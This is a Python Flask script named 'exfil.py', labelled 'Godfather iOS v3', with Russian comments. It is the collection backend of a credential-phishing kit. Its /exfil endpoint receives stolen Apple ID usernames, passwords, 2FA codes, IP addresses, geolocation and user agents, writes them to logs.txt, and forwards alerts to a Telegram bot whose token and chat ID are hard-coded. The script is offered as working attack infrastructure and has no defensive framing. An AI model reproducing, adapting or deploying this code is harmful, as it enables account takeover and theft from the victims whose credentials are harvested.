# exfil.py - Godfather iOS v3 (Python версия)
from flask import Flask, request, jsonify
import json
import datetime
import requests

app = Flask(__name__)

@app.route('/exfil', methods=['POST'])
def exfil_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error'}), 400
        
        log_entry = {
            'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'type': data.get('type', 'unknown'),
            'apple_id': data.get('data', {}).get('appleId', ''),
            'password': data.get('data', {}).get('password', ''),
            '2fa': data.get('data', {}).get('code', ''),
            'ip': data.get('fp', {}).get('ip', request.remote_addr),
            'geo': data.get('fp', {}).get('geo', ''),
            'ua': data.get('fp', {}).get('ua', request.headers.get('User-Agent', '')),
            'url': data.get('url', ''),
            'referrer': data.get('referrer', '')
        }
        
        # Сохраняем в файл
        with open('logs.txt', 'a', encoding='utf-8') as f:
            log_line = " | ".join(str(v) for v in log_entry.values()) + "\n"
            f.write(log_line)
        
        # Отправляем в Telegram
        send_telegram_alert(log_entry)
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'status': 'error'}), 500

def send_telegram_alert(log_data):
    """Отправка уведомления в Telegram"""
    try:
        bot_token = '8532033730:AAEWrbOvWTAIIIzcr4bjzEmXGFNR2S-9qVw'
        chat_id = '7739607647'
        
        message = (
            f"🚨 GODFATHER iOS v3\n"
            f"Type: {log_data['type']}\n"
            f"Apple ID: {log_data['apple_id']}\n"
            f"Password: {'●' * 8 if log_data['password'] else '—'}\n"
            f"2FA: {log_data['2fa'] or '—'}\n"
            f"IP: {log_data['ip']} | {log_data['geo']}\n"
            f"Time: {log_data['timestamp']}"
        )
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        requests.post(url, json=payload, timeout=5)
        
    except Exception as e:
        print(f"Telegram error: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)